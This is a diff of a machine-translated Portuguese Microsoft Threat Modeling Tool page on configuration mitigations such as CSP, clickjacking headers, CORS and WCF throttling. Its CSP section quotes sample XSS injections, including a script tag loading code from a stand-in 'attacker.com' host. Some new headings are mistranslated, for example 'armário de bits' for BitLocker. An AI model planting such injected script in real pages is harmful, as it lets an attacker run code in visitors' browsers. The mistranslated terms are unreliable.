@@ -1,5 +1,5 @@
 ---
-title: Gerenciamento de configuração para a ferramenta de modelagem de ameaças da Microsoft
+title: Gerenciamento de configuração para o Microsoft Threat Modeling Tool
 titleSuffix: Azure
 description: atenuações de ameaças expostas na ferramenta de modelagem de ameaças
 services: security
@@ -16,43 +16,43 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
-ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: MT
 ms.contentlocale: pt-BR
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "81687969"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204246"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Estrutura de segurança: Gerenciamento de configurações | Atenuações 
 | Produto/Serviço | Artigo |
 | --------------- | ------- |
-| **Aplicação web** | <ul><li>[Implementar a Política de Segurança de Conteúdo (CSP) e desativar javascript inline](#csp-js)</li><li>[Habilite o filtro XSS do navegador](#xss-filter)</li><li>[ASP.NET aplicativos devem desativar o rastreamento e a depuração antes da implantação](#trace-deploy)</li><li>[Acesse javascripts de terceiros somente de fontes confiáveis](#js-trusted)</li><li>[Certifique-se de que as páginas ASP.NET autenticadas incorporem defesas de revestir ou de cliques](#ui-defenses)</li><li>[Certifique-se de que apenas origens confiáveis são permitidas se o CORS estiver habilitado em ASP.NET aplicativos da Web](#cors-aspnet)</li><li>[Ativar validaraaaaa atributo em ASP.NET Páginas](#validate-aspnet)</li><li>[Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente](#local-js)</li><li>[Desativar o mímico automático sniffing](#mime-sniff)</li><li>[Remova os cabeçalhos padrão do servidor nos sites do Windows Azure para evitar impressões digitais](#standard-finger)</li></ul> |
-| **Banco de dados** | <ul><li>[Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados](#firewall-db)</li></ul> |
-| **API Web** | <ul><li>[Certifique-se de que apenas origens confiáveis são permitidas se o CORS estiver habilitado em ASP.NET API da Web](#cors-api)</li><li>[Criptografe seções dos arquivos de configuração da Web API que contêm dados confidenciais](#config-sensitive)</li></ul> |
-| **Dispositivo IoT** | <ul><li>[Certifique-se de que todas as interfaces de admin estão protegidas com credenciais fortes](#admin-strong)</li><li>[Garantir que um código desconhecido não seja executado em dispositivos](#unknown-exe)</li><li>[Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker](#partition-iot)</li><li>[Certifique-se de que apenas os serviços/recursos mínimos estejam habilitados nos dispositivos](#min-enable)</li></ul> |
-| **Gateway de Campo de IoT** | <ul><li>[Criptografe o SISTEMA OPERACIONAL e partições adicionais do IoT Field Gateway com bit-locker](#field-bit-locker)</li><li>[Certifique-se de que as credenciais de login padrão do gateway de campo sejam alteradas durante a instalação](#default-change)</li></ul> |
-| **Gateway de Nuvem IoT** | <ul><li>[Certifique-se de que o Cloud Gateway implemente um processo para manter o firmware dos dispositivos conectados atualizado](#cloud-firmware)</li></ul> |
-| **Limite de confiança de máquina** | <ul><li>[Certifique-se de que os dispositivos tenham controles de segurança de ponto final configurados de acordo com políticas organizacionais](#controls-policies)</li></ul> |
-| **Armazenamento Azure** | <ul><li>[Garanta o gerenciamento seguro das chaves de acesso de armazenamento do Azure](#secure-keys)</li><li>[Certifique-se de que apenas origens confiáveis são permitidas se o CORS estiver habilitado no armazenamento do Azure](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[Habilitar o recurso de limitação do serviço WCF](#throttling)</li><li>[Divulgação wcf-informações através de metadados](#info-metadata)</li></ul> | 
+| **Aplicativo Web** | <ul><li>[Implementar a CSP (política de segurança de conteúdo) e desabilitar o JavaScript embutido](#csp-js)</li><li>[Habilitar o filtro XSS do navegador](#xss-filter)</li><li>[Os aplicativos ASP.NET devem desabilitar o rastreamento e a depuração antes da implantação](#trace-deploy)</li><li>[Acesse JavaScripts de terceiros somente de fontes confiáveis](#js-trusted)</li><li>[Garantir que as páginas ASP.NET autenticadas incorporem as defesas de recômoda da interface do usuário ou de tomada de clique](#ui-defenses)</li><li>[Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web ASP.NET](#cors-aspnet)</li><li>[Habilitar o atributo ValidateRequest em páginas ASP.NET](#validate-aspnet)</li><li>[Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente](#local-js)</li><li>[Desabilitar a detecção automática de MIME](#mime-sniff)</li><li>[Remover cabeçalhos de servidor padrão em sites do Windows Azure para evitar impressão digital](#standard-finger)</li></ul> |
+| **Backup de banco de dados** | <ul><li>[Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados](#firewall-db)</li></ul> |
+| **API Web** | <ul><li>[Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado no ASP.NET Web API](#cors-api)</li><li>[Criptografar seções de arquivos de configuração da API Web que contêm dados confidenciais](#config-sensitive)</li></ul> |
+| **Dispositivo IoT** | <ul><li>[Verifique se todas as interfaces de administração estão protegidas com credenciais fortes](#admin-strong)</li><li>[Garantir que um código desconhecido não seja executado em dispositivos](#unknown-exe)</li><li>[Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker](#partition-iot)</li><li>[Garantir que apenas os serviços/recursos mínimos estejam habilitados nos dispositivos](#min-enable)</li></ul> |
+| **Gateway de Campo de IoT** | <ul><li>[Criptografar o sistema operacional e partições adicionais do gateway de campo IoT com o armário de bits](#field-bit-locker)</li><li>[Verifique se as credenciais de logon padrão do gateway de campo foram alteradas durante a instalação](#default-change)</li></ul> |
+| **Gateway de Nuvem IoT** | <ul><li>[Verifique se o gateway de nuvem implementa um processo para manter o firmware dos dispositivos conectados atualizado](#cloud-firmware)</li></ul> |
+| **Limite de confiança de máquina** | <ul><li>[Verifique se os dispositivos têm controles de segurança de ponto de extremidade configurados de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
+| **Armazenamento do Azure** | <ul><li>[Garantir o gerenciamento seguro de chaves de acesso de armazenamento do Azure](#secure-keys)</li><li>[Certifique-se de que apenas origens confiáveis sejam permitidas se o CORS estiver habilitado no armazenamento do Azure](#cors-storage)</li></ul> |
+| **WCF** | <ul><li>[Habilitar o recurso de limitação do serviço WCF](#throttling)</li><li>[WCF-divulgação de informações por meio de metadados](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementar a Política de Segurança de Conteúdo (CSP) e desabilitar o JavaScript embutido
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
 | **Tecnologias aplicáveis** | Genérico |
 | **Atributos**              | N/D  |
 | **Referências**              | [Uma introdução à Política de Segurança de Conteúdo](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Referência da Política de Segurança de Conteúdo](https://content-security-policy.com/), [Recursos de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introdução à Política de Segurança de Conteúdo](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Posso usar a CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Etapas** | <p>A CSP (Política de Segurança de Conteúdo) é um mecanismo de defesa aprofundado, um padrão de W3C, que permite aos proprietários do aplicativo Web ter controle sobre os conteúdos inseridos em seus sites. A CSP é adicionada como um cabeçalho de resposta HTTP no servidor Web e é aplicada pelos navegadores do cliente. Ela é uma política baseada na lista de permissões; um site pode informar um conjunto de domínios confiáveis, dos quais conteúdos ativos, como JavaScript, podem ser carregados.</p><p>A CSP oferece os seguintes benefícios de segurança:</p><ul><li>**Proteção contra XSS:** se uma página for vulnerável a XSS, um invasor poderá explorá-la de duas maneiras:<ul><li>Injetar `<script>malicious code</script>`: Esta exploração não funcionará devido à Restrição base-1 da CSP</li><li>Injetar `<script src="http://attacker.com/maliciousCode.js"/>`: Essa exploração não funcionará, uma vez que o domínio controlado pelo invasor não estará na lista branca de domínios do CSP</li></ul></li><li>**Controle sobre a pesquisa por dados:** se algum conteúdo mal-intencionado em uma página da Web tentar se conectar a um site externo e roubar dados, a conexão será anulada pelo CSP. Isso porque o domínio de destino não estará na lista branca do CSP</li><li>**Defesa contra furto de clique:** o furto de clique é uma técnica de ataque na qual um invasor adultera um site genuíno e faz com que os usuários cliquem nos elementos de sua interface do usuário. Para se proteger contra o furto de clique atualmente, basta configurar um cabeçalho de resposta X-Frame-Options. Nem todos os navegadores respeitam esse cabeçalho, por isso a CSP será a melhor maneira de se defender contra o furto de clique</li><li>**Relatórios de ataque em tempo real:** se houver um ataque de injeção em um site com a CSP habilitada, os navegadores disparam automaticamente uma notificação para um ponto de extremidade configurado no servidor Web. Dessa forma, a CSP atua como um sistema de aviso em tempo real.</li></ul> |
+| **Etapas** | <p>A CSP (Política de Segurança de Conteúdo) é um mecanismo de defesa aprofundado, um padrão de W3C, que permite aos proprietários do aplicativo Web ter controle sobre os conteúdos inseridos em seus sites. A CSP é adicionada como um cabeçalho de resposta HTTP no servidor Web e é aplicada pelos navegadores do cliente. Ela é uma política baseada na lista de permissões; um site pode informar um conjunto de domínios confiáveis, dos quais conteúdos ativos, como JavaScript, podem ser carregados.</p><p>A CSP oferece os seguintes benefícios de segurança:</p><ul><li>**Proteção contra XSS:** se uma página for vulnerável a XSS, um invasor poderá explorá-la de duas maneiras:<ul><li>Injetar `<script>malicious code</script>`: Essa exploração não funcionará devido à restrição base do CSP-1</li><li>Injetar `<script src="http://attacker.com/maliciousCode.js"/>`: Essa exploração não funcionará, pois o domínio controlado pelo invasor não estará na lista branca do CSP de domínios</li></ul></li><li>**Controle sobre a pesquisa por dados:** se algum conteúdo mal-intencionado em uma página da Web tentar se conectar a um site externo e roubar dados, a conexão será anulada pelo CSP. Isso ocorre porque o domínio de destino não estará na lista de permissões do CSP</li><li>**Defesa contra furto de clique:** o furto de clique é uma técnica de ataque na qual um invasor adultera um site genuíno e faz com que os usuários cliquem nos elementos de sua interface do usuário. Para se proteger contra o furto de clique atualmente, basta configurar um cabeçalho de resposta X-Frame-Options. Nem todos os navegadores respeitam esse cabeçalho, por isso a CSP será a melhor maneira de se defender contra o furto de clique</li><li>**Relatórios de ataque em tempo real:** se houver um ataque de injeção em um site com a CSP habilitada, os navegadores disparam automaticamente uma notificação para um ponto de extremidade configurado no servidor Web. Dessa forma, a CSP atua como um sistema de aviso em tempo real.</li></ul> |
 
 ### <a name="example"></a>Exemplo
 Política de exemplo: 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-Essa política permite que os scripts carreguem apenas do servidor do aplicativo web e do servidor de análise do Google. Os scripts carregados em qualquer outro site serão rejeitados. Quando a CSP estiver habilitada em um site, os seguintes recursos serão desabilitados automaticamente para atenuar ataques de XSS. 
+Essa política permite que os scripts sejam carregados somente do servidor do aplicativo Web e do Google Analytics Server. Os scripts carregados em qualquer outro site serão rejeitados. Quando a CSP estiver habilitada em um site, os seguintes recursos serão desabilitados automaticamente para atenuar ataques de XSS. 
 
 ### <a name="example"></a>Exemplo
 Os scripts embutido não serão executados. Veja abaixo exemplos de scripts embutidos: 
@@ -70,7 +70,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Habilitar o filtro XSS do navegador
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -81,7 +81,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>Os aplicativos ASP.NET devem desabilitar o rastreamento e a depuração antes da implantação
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -92,18 +92,18 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Acessar JavaScripts de terceiros somente de fontes confiáveis
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
 | **Tecnologias aplicáveis** | Genérico |
 | **Atributos**              | N/D  |
 | **Referências**              | N/D  |
-| **Etapas** | os JavaScripts de terceiros devem ser referenciados somente de fontes confiáveis. Os pontos de extremidade de referência devem estar sempre no SSL. |
+| **Etapas** | os JavaScripts de terceiros devem ser referenciados somente de fontes confiáveis. Os pontos de extremidade de referência devem estar sempre em TLS. |
 
 ## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Garantir que as páginas ASP.NET autenticadas incluam defesas contra adulterações de interface do usuário ou furto de clique
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -113,7 +113,7 @@ Example: var str="alert(1)"; eval(str);
 | **Etapas** | <p>o furto de clique, também conhecido como "ataque de adulteração de interface do usuário", ocorre quando um invasor utiliza várias camadas transparentes ou opacas para fazer com que o usuário clique em um botão ou link de outra página enquanto, na verdade, ele pretendia clicar na página do nível superior.</p><p>Para aplicar essas camadas, é preciso criar uma página mal-intencionada com um iframe para carregar a página da vítima. Assim, o invasor é "sequestra" os cliques destinados a uma página e os encaminha para outra página, que provavelmente pertence a outro aplicativo, domínio ou ambos. Para evitar esse tipo de ataque, defina os cabeçalhos de resposta HTTP de X-Frame-Options adequados que instruem o navegador a não permitir enquadramentos de outros domínios</p>|
 
 ### <a name="example"></a>Exemplo
-O cabeçalho X-FRAME-OPTIONS pode ser definido via Web.config IIS. Snippet de código web.config para sites que nunca devem ser enquadrados: 
+O cabeçalho X-FRAME-OPTIONS pode ser definido por meio do IIS Web. config. Trecho de código Web. config para sites que nunca devem ser emoldurados: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -138,7 +138,7 @@ O código do arquivo web.config para sites que só devem ser enquadrados por pá
 
 ## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web do ASP.NET
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -169,7 +169,7 @@ Observe que é essencial garantir que a lista de origens no atributo "Access-Con
 
 ## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Habilitar o atributo ValidateRequest em páginas ASP.NET
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -195,7 +195,7 @@ Observe que o recurso de validação de solicitação não tem suporte no pipeli
 
 ## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -206,7 +206,7 @@ Observe que o recurso de validação de solicitação não tem suporte no pipeli
 
 ## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Desabilitar a detecção automática de MIME
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -271,7 +271,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Remover cabeçalhos de servidor padrão nos sites do Microsoft Azure para evitar impressões digitais
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Aplicativo Web | 
 | **Fase do SDL**               | Build |  
@@ -282,7 +282,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Banco de dados | 
 | **Fase do SDL**               | Build |  
@@ -293,7 +293,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado na ASP.NET Web API
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | API Web | 
 | **Fase do SDL**               | Build |  
@@ -389,7 +389,7 @@ public class ResourcesController : ApiController
 }
 ```
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | API Web | 
 | **Fase do SDL**               | Build |  
@@ -481,7 +481,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Criptografar as seções dos arquivos de configuração da API Web que contêm dados confidenciais
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | API Web | 
 | **Fase do SDL**               | Implantação |  
@@ -492,7 +492,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Garantir que todas as interfaces de administrador sejam protegidas com credenciais fortes
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Dispositivo IoT | 
 | **Fase do SDL**               | Implantação |  
@@ -503,7 +503,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Garantir que um código desconhecido não seja executado em dispositivos
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Dispositivo IoT | 
 | **Fase do SDL**               | Build |  
@@ -514,7 +514,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Dispositivo IoT | 
 | **Fase do SDL**               | Build |  
@@ -525,7 +525,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Garantir que apenas o mínimo de serviços/recursos estejam habilitados nos dispositivos
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Dispositivo IoT | 
 | **Fase do SDL**               | Implantação |  
@@ -534,9 +534,9 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 | **Referências**              | N/D  |
 | **Etapas** | Não habilite ou desabilite no sistema operacional recursos ou serviços que não sejam necessários ao funcionamento da solução. Por exemplo, se o dispositivo não precisar de uma interface de usuário para ser implantado, instale o Windows IoT Core no modo sem periféricos. |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Criptografe o SISTEMA OPERACIONAL e partições adicionais do IoT Field Gateway com bit-locker
+## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Criptografar o sistema operacional e partições adicionais do gateway de campo IoT com o armário de bits
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Gateway de Campo de IoT | 
 | **Fase do SDL**               | Implantação |  
@@ -547,7 +547,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Garantir que as credenciais de logon padrão do gateway de campo sejam alteradas durante a instalação
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Gateway de Campo de IoT | 
 | **Fase do SDL**               | Implantação |  
@@ -558,7 +558,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Garantir que o Gateway de Nuvem implemente um processo para manter atualizado o firmware de dispositivos conectados
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Gateway de Nuvem IoT | 
 | **Fase do SDL**               | Build |  
@@ -569,7 +569,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Garantir que os controles de segurança de ponto de extremidade estejam configurados nos dispositivos de acordo com as políticas organizacionais
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Limite de confiança de máquina | 
 | **Fase do SDL**               | Implantação |  
@@ -580,7 +580,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Garantir o gerenciamento seguro das chaves de acesso do Armazenamento do Azure
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Armazenamento do Azure | 
 | **Fase do SDL**               | Implantação |  
@@ -591,7 +591,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado no Armazenamento do Azure
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | Armazenamento do Azure | 
 | **Fase do SDL**               | Build |  
@@ -602,7 +602,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 
 ## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Habilitar o recurso de limitação do serviço WCF
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | WCF | 
 | **Fase do SDL**               | Build |  
@@ -625,7 +625,7 @@ Veja abaixo um exemplo de configuração com a limitação habilitada:
 
 ## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Divulgação de informações do WCF por meio de metadados
 
-| Title                   | Detalhes      |
+| Título                   | Detalhes      |
 | ----------------------- | ------------ |
 | **Componente**               | WCF | 
 | **Fase do SDL**               | Build |  
